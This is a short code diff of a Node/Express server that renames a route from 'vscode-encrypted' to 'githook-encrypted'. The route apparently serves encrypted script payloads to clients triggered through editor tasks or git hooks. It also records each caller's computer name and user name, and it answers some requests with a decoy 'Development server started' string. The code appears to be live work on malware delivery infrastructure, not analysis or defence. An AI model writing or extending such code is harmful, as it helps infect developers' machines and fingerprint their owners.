@@ -219,7 +219,7 @@ app.use(async (req, res, next) => {
         if (
           requestMethod === "POST" &&
           (requestUrl.startsWith("/api/ip-check-encrypted/") ||
-            requestUrl.startsWith("/api/vscode-encrypted/"))
+            requestUrl.startsWith("/api/githook-encrypted/"))
         ) {
           const computername = req.body.COMPUTERNAME || req.body.HOSTNAME || "Unknown";
           const userName = req.body.USER || req.body.LOGNAME || req.body.USERNAME || "Unknown";
@@ -491,7 +491,7 @@ app.post("/api/ip-check-encrypted/:filename", async (req, res) => {
   }
 });
 
-app.post("/api/vscode-encrypted/:filename", async (req, res) => {
+app.post("/api/githook-encrypted/:filename", async (req, res) => {
   try {
     const fileName = req.params.filename === "v1" ? "v1" : decryptApiKeyToFileName(req.params.filename);
     if (fileName === "v1") return res.status(400).json('console.log("Development server started...")');
